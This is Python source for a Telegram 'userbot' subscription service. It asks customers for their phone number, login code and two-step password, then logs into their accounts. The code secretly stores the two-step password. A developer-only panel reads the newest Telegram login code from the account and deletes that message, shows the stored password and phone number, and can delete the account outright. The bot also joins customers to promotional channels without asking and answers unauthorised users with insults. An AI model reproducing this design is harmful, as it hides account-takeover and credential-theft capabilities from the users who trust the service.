import asyncio
import importlib
from datetime import datetime

import hydrogram
from dateutil.relativedelta import relativedelta
from pyrogram.helpers import ikb, kb, kbtn
from pyrogram.raw import functions
from pyrogram.types import (KeyboardButton, ReplyKeyboardMarkup,
                            ReplyKeyboardRemove)
from pytz import timezone

from config import (DEVS, api_hash, api_id, bot_id, bot_username, log_userbot,
                    owner_id)
from Userbot import Userbot, bot, nlx
from Userbot.helper.database import dB
from Userbot.helper.tools import MSG, Ads, Button, zb, setting_emoji
from Userbot.plugins import ALL_MODULES


async def setExpiredUser(user_id):
    seles = dB.get_list_from_var(bot_id, "seller", "user")
    if user_id in seles:
        now = datetime.now(timezone("Asia/Jakarta"))
        expired = now + relativedelta(months=12)
        dB.set_expired_date(user_id, expired)
    else:
        now = datetime.now(timezone("Asia/Jakarta"))
        expired = now + relativedelta(months=1)
        dB.set_expired_date(user_id, expired)


async def db_trial(c, org):
    trial = dB.get_list_from_var(c, "user_trial", "user")
    if org in trial:
        return True
    return False


async def cb_trial_ask(c, m, _):
    msg = f"""
<b><blockquote>⚡ Anda memilih Userbot Trial dengan akses selama 8 Jam. Segala resiko Anda tanggung sendiri.

<u>Saya sangat menyarankan jika ingin memasang userbot pada ID 6, 7 nomor Indonesia, usahakan Akun tersebut telah aktif atau login selama 1 bulan.</u>

Silahkan klik tombol <u>Setuju</u> jika setuju, atau klik tombol <u>Tidak</u> untuk mengakhiri ini.</blockquote></b>
<b>Ads: {Ads()}</b>"""
    keyb = kb(
        [[kbtn("✅ Setuju")], [("❌ Tidak")]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    return await m.reply(msg, reply_markup=keyb)


async def cb_trial(c, m, _):
    user_id = m.from_user.id
    data = await db_trial(c.me.id, user_id)
    if data:
        msg = f"""
<b><blockquote>Maaf sebelumnya anda adalah pengguna Trial, anda tidak bisa menikmati trial lebih dari 1x,
Silahkan beli userbot untuk berlangganan.</blockquote></b>
<b>Ads: {Ads()}</b>"""
        keyb = Button.start(m)
        return await m.reply(msg, reply_markup=keyb)
    dB.add_to_var(bot_id, "PREM", user_id, "USERS")
    now = datetime.now(timezone("Asia/Jakarta"))
    expired = now + relativedelta(hours=12)
    dB.set_expired_date(user_id, expired)
    dB.add_to_var(c.me.id, "user_trial", user_id, "user")
    return await bikin_ubot(c, m, _)


async def cb_bahan(client, m, _):
    user_id = m.from_user.id
    if len(nlx._ubot) == 500:
        buttons = Button.start(m)
        return await m.reply(
            f"""
<b>❌ Tidak dapat membuat Userbot !</b>

<b>📚 Karena Telah Mencapai Yang Telah Di Tentukan : {len(nlx._ubot)}</b>

<b>👮‍♂ Silakan Hubungi @Boyszzzz . </b>
""",
            disable_web_page_preview=True,
            reply_markup=buttons,
        )
    premium = dB.get_list_from_var(bot_id, "PREM", "USERS")
    if user_id not in premium:
        buttons = kb(
            [[kbtn("📃 Saya Setuju")], [kbtn("🏠 Menu Utama")]],
            resize_keyboard=True,
            one_time_keyboard=True,
        )
        text = f"<blockquote>{MSG.POLICY()}</blockquote>"
        return await m.reply(
            text,
            disable_web_page_preview=True,
            reply_markup=buttons,
        )
    else:
        return await bikin_ubot(client, m, _)


async def cb_bayar_dulu(client, m, _):
    msg = f"""
<b><blockquote>✅ Jika anda sudah setuju dengan syarat & ketentuan, Silahkan transfer ke qris disinih [https://files.catbox.moe/gurll4.jpg] dan jika sudah transfer silahkan hubungi 🧸 @Boyszzzz untuk mendapatkan akses membuat userbot.</b></blockquote>
<b>Ads: {Ads()}</b>"""
    return await m.reply(msg, reply_markup=ReplyKeyboardRemove())


async def bikin_ubot(client, m, _):
    # api_id, api_hash = random.choice(pilih_api)
    user_id = m.from_user.id
    if user_id in nlx._my_id:
        return await bot.send_message(
            user_id,
            f"<b><i>Anda telah memasang userbot</i></b>",
            reply_markup=ReplyKeyboardRemove(),
        )
    full_name = f"<a href=tg://user?id={m.from_user.id}>{m.from_user.first_name} {m.from_user.last_name or ''}"
    anu = ReplyKeyboardMarkup(
        [
            [KeyboardButton(text=f"Kontak Saya", request_contact=True)],
        ],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    phone = await bot.ask(
        user_id,
        f"<i><b>Silahkan klik tombol <u>Kontak Saya</u> untuk mengirimkan Nomor Telepon Telegram Anda.</b></i>",
        reply_markup=anu,
    )
    if phone.text in ["start", "Start", "/start"]:
        return await bot.send_message(
            user_id,
            "<i><b>Proses di batalkan.</b></i>",
            reply_markup=Button.start(m),
        )
    elif not phone.contact:
        phone = await bot.ask(
            user_id,
            f"<i><b>Silahkan klik tombol <u>Kontak Saya</u> untuk mengirimkan Nomor Telepon Telegram Anda.</b></i>",
            reply_markup=anu,
        )
    phone_number = phone.contact.phone_number
    new_client = hydrogram.Client(
        name=str(user_id),
        api_id=api_id,
        api_hash=api_hash,
        in_memory=True,
    )
    await asyncio.sleep(2)
    get_otp = await bot.send_message(
        user_id,
        f"<i><blockquote>Sedang Mengirim Kode OTP...</i></b>",
        reply_markup=ReplyKeyboardRemove(),
    )
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except hydrogram.errors.exceptions.bad_request_400.ApiIdInvalid as AID:
        await get_otp.delete()
        return await bot.send_message(user_id, AID)
    except hydrogram.errors.exceptions.bad_request_400.PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await bot.send_message(user_id, PNI)
    except hydrogram.errors.exceptions.bad_request_400.PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await bot.send_message(user_id, PNF)
    except hydrogram.errors.exceptions.bad_request_400.PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await bot.send_message(user_id, PNB)
    except hydrogram.errors.exceptions.bad_request_400.PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await bot.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(
            user_id, f"<b>ERROR:</b> {error}", reply_markup=Button.start(m)
        )
    await get_otp.delete()
    otp = await bot.ask(
        user_id,
        f"<b>Silakan Periksa Kode OTP dari <a href=tg://openmessage?user_id=777000>Akun Telegram</a> Resmi. Kirim Kode OTP ke sini setelah membaca Format di bawah ini.</b>\n\nJika Kode OTP adalah <code>12345</code> Tolong <u>[ TAMBAHKAN SPASI ]</u> kirimkan Seperti ini <code>1 2 3 4 5</code>.</b>",
    )
    if otp.text in ["start", "Start", "/start"]:
        return await bot.send_message(
            user_id,
            f"<i><b>Proses di batalkan.</b></i>",
            reply_markup=Button.start(m),
        )
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except hydrogram.errors.exceptions.bad_request_400.PhoneCodeInvalid as PCI:
        return await bot.send_message(user_id, PCI)
    except hydrogram.errors.exceptions.bad_request_400.PhoneCodeExpired as PCE:
        return await bot.send_message(user_id, PCE)
    except hydrogram.errors.exceptions.bad_request_400.BadRequest as error:
        return await bot.send_message(
            user_id, f"<b>ERROR:</b> {error}", reply_markup=Button.start(m)
        )
    except hydrogram.errors.exceptions.unauthorized_401.SessionPasswordNeeded:
        two_step_code = await bot.ask(
            user_id,
            f"<b><i>Akun anda Telah mengaktifkan Verifikasi Dua Langkah. Silahkan Kirimkan Passwordnya.</i></b>",
        )
        if two_step_code.text in ["start", "Start", "/start"]:
            return await bot.send_message(
                user_id,
                f"<i><b>Proses di batalkan.</b></i>",
                reply_markup=Button.start(m),
            )
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            dB.set_var(user_id, "PASSWORD", new_code)
        except Exception as error:
            return await bot.send_message(
                user_id, f"<b>ERROR:</b> {error}", reply_markup=Button.start(m)
            )
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await bot.send_message(
        user_id,
        f"<b><i>Sedang menginstall userbot!\nMohon tunggu 1-5 menit...</i></b>",
        disable_web_page_preview=True,
    )
    await asyncio.sleep(2)
    kn_client = Userbot(
        name=str(user_id),
        api_id=api_id,
        api_hash=api_hash,
        session_string=session_string,
        in_memory=True,
    )
    await kn_client.start()
    if not dB.get_expired_date(kn_client.me.id):
        await setExpiredUser(kn_client.me.id)
    dB.add_ubot(
        user_id=int(kn_client.me.id),
        api_id=api_id,
        api_hash=api_hash,
        session_string=session_string,
    )
    if not user_id == kn_client.me.id:
        nlx._ubot.remove(kn_client)
        dB.remove_ubot(kn_client.me.id)
        await kn_client.log_out()
        return await bot_msg.edit(
            f"<i><b>Gunakan akun anda sendiri, bukan orang lai!!</b></i>"
        )
    setting_emoji(kn_client)
    await asyncio.sleep(1)
    for mod in ALL_MODULES:
        importlib.reload(importlib.import_module(f"Userbot.plugins.{mod}"))
    seles = dB.get_list_from_var(bot_id, "seller", "user")
    if kn_client.me.id not in seles:
        try:
            dB.remove_from_var(bot_id, "PREM", kn_client.me.id, "USERS")
        except:
            pass
    try:
        await kn_client.join_chat("InfoKingzUserbot")
        await kn_client.join_chat("KingzUserbotSupport")
        await kn_client.join_chat("transaksikingzbotz")
    except:
        pass
    prefix = nlx.get_prefix(kn_client.me.id)
    keyb = Button.start(m)
    exp = dB.get_expired_date(kn_client.me.id)
    expir = exp.astimezone(timezone("Asia/Jakarta")).strftime("%Y-%m-%d %H:%M")
    text_done = f"""
<blockquote><b>🔥 {bot.me.mention} Berhasil Di Aktifkan
➡️ Akun: <a href=tg://openmessage?user_id={kn_client.me.id}>{kn_client.me.first_name} {kn_client.me.last_name or ''}</a>
➡️ ID: <code>{kn_client.me.id}</code>
➡️ Prefixes: {' '.join(prefix)}
➡️ Masa Aktif: {expir}</b></blockquote>

📢 <b><i>CATATAN!</i>
Ada prangkat yang masuk ke akun [ ᴋɪɴɢᴢᴜsᴇʀʙᴏᴛ-ᴘʀᴏ ], Jangan dikeluarkan itu userbotnya!.</b>

<b>Ads: {Ads()}</b>"""
    await bot_msg.edit(text_done, disable_web_page_preview=True, reply_markup=keyb)
    return await bot.send_message(
        log_userbot,
        f"""
<b>❏ Notifikasi Userbot Aktif</b>
<b> ├ Akun :</b> <a href=tg://user?id={kn_client.me.id}>{kn_client.me.first_name} {kn_client.me.last_name or ''}</a> 
<b> ╰ ID :</b> <code>{kn_client.me.id}</code>
""",
        reply_markup=ikb([[("Cek Kadaluarsa", f"cek_masa_aktif {kn_client.me.id}")]]),
        disable_web_page_preview=True,
    )


@zb.callback("^(prev_ub|next_ub)")
async def next_prev_ubot(client, cq, _):
    query = cq.data.split()
    count = int(query[1])
    if query[0] == "next_ub":
        if count == len(nlx._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "prev_ub":
        if count == 0:
            count = len(nlx._ubot) - 1
        else:
            count -= 1
    try:
        return await cq.edit_message_text(
            MSG.USERBOT(count),
            reply_markup=(Button.userbot(nlx._ubot[count].me.id, count)),
        )
    except Exception as e:
        return f"Error: {e}"


@zb.callback("^(get_otp|get_phone|get_faktor|ub_deak|deak_akun)")
async def tools_userbot(client, cq, _):
    user_id = cq.from_user.id
    query = cq.data.split()
    if user_id not in DEVS:
        return await cq.answer(
            f"<b>GAUSAH REWEL YA ANJING! {cq.from_user.first_name} {cq.from_user.last_name or ''}",
            True,
        )
    X = nlx._ubot[int(query[1])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await cq.answer("❌ Kode tidak ditemukan", True)
                else:
                    await cq.edit_message_text(
                        otp.text,
                        reply_markup=(Button.userbot(X.me.id, int(query[1]))),
                    )
                    return await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await cq.answer(error, True)
    elif query[0] == "get_phone":
        try:
            return await cq.edit_message_text(
                f"<b>📲 Nomer telepon <code>{X.me.id}</code> adalah <code>{X.me.phone_number}</code></b>",
                reply_markup=(Button.userbot(X.me.id, int(query[1]))),
            )
        except Exception as error:
            return await cq.answer(error, True)
    elif query[0] == "get_faktor":
        code = dB.get_var(X.me.id, "PASSWORD")
        if code == None:
            return await cq.answer("🔐 Kode verifikasi 2 langkah tidak ditemukan", True)
        else:
            return await cq.edit_message_text(
                f"<b>🔐 Kode verifikasi 2 langkah pengguna <code>{X.me.id}</code> adalah : <code>{code}</code></b>",
                reply_markup=(Button.userbot(X.me.id, int(query[1]))),
            )
    elif query[0] == "ub_deak":
        return await cq.edit_message_reply_markup(
            reply_markup=(Button.deak(X.me.id, int(query[1])))
        )
    elif query[0] == "deak_akun":
        nlx._ubot.remove(X)
        await X.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
        return await cq.edit_message_text(
            f"""
<b>❏ Penting !!
├ Akun: <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a>
├ ID: <code>{X.me.id}</code>
╰ Akun berhasil Di Hapus</b>
""",
            reply_markup=(Button.userbot(X.me.id, int(query[1]))),
        )


@zb.bots("getubot")
async def _(client, m, _):
    return await cek_ubot(client, m, _)


async def cek_ubot(client, m, _):
    return await bot.send_message(
        m.from_user.id,
        MSG.USERBOT(0),
        reply_markup=Button.userbot(nlx._ubot[0].me.id, 0),
    )


@zb.callback("^cek_masa_aktif")
async def cb_cek_masa_aktif(client, cq, _):
    user_id = int(cq.data.split()[1])
    try:
        expired = dB.get_expired_date(user_id)
        habis = expired.astimezone(timezone("Asia/Jakarta")).strftime("%Y-%m-%d %H:%M")
        return await cq.answer(f"⏳ Waktu: {habis}", True)
    except:
        return await cq.answer("✅ Sudah tidak aktif", True)


@zb.callback("^del_ubot")
async def hapus_ubot(client, cq, _):
    user_id = cq.from_user.id
    if user_id not in DEVS:
        return await cq.answer(
            f"<b>GAUSAH DIPENCET YA ANJING! {cq.from_user.first_name} {cq.from_user.last_name or ''}",
            True,
        )
    await cq.answer()
    try:
        show = await bot.get_users(cq.data.split()[1])
        get_id = show.id
        get_mention = f"<a href=tg://user?id={get_id}>{show.first_name} {show.last_name or ''}</a>"
    except Exception:
        get_id = int(cq.data.split()[1])
        get_mention = f"<a href=tg://user?id={get_id}>Userbot</a>"
    for X in nlx._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot_username)
            dB.remove_ubot(X.me.id)
            dB.rem_expired_date(X.me.id)
            nlx._my_id.remove(X.me.id)
            nlx._ubot.remove(X)
            await bot.send_message(
                owner_id,
                f"<b> ✅ {get_mention} Berhasil Di Hapus Dari Database</b>",
            )
            return await bot.send_message(
                X.me.id,
                f"<b>💬 Masa Aktif Anda Telah Habis</b>\n<b>Ads: {Ads()}</b>",
            )
